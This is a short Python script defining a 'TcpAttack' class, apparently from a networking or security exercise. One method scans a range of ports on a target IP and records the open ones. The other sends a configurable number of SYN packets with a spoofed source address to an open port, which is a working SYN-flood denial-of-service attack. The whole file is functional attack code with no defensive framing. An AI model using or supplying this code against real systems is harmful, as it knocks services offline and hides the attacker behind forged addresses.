#!/usr/bin/env python3

import sys
import socket
import scapy.all as scapy

class TcpAttack:
    # spoofIP: String containing the IP address to spoof
    # targetIP: String containing the IP address of the target computer to attack
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP


    # rangeStart: Integer designating the first port in the range of ports being scanned.
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # No return value, but writes open ports to openports.txt
    def scanTarget(self, rangeStart, rangeEnd):
        with open('openports.txt', 'w') as out_file:
            for port in range(rangeStart, rangeEnd+1):
                # Create and configure socket object.
                socket_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket_object.settimeout(0.1)
                if not socket_object.connect_ex((self.targetIP, port)):
                    out_file.write(str(port) + '\n')
        out_file.close()
        return


    # port: Integer designating the port that the attack will use
    # numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self, port, numSyn):
        return_val = 0
        with open('openports.txt', 'r') as port_file:
            open_ports = port_file.readlines()
        open_ports_list = [int(p) for p in open_ports]
        if port in open_ports_list:
            for i in range(numSyn): #Send numSyn Packets
                #Construct  IP header
                IP_header = scapy.IP(src=self.spoofIP, dst=self.targetIP)
                #Construct TCP Header
                TCP_header = scapy.TCP(dport=port, flags='S')
                #Construct Packet
                packet = IP_header / TCP_header
                try:
                    #Send Packet
                    scapy.send(packet)
                    return_val = 1
                except Exception as error_message:
                    print(error_message)
        return return_val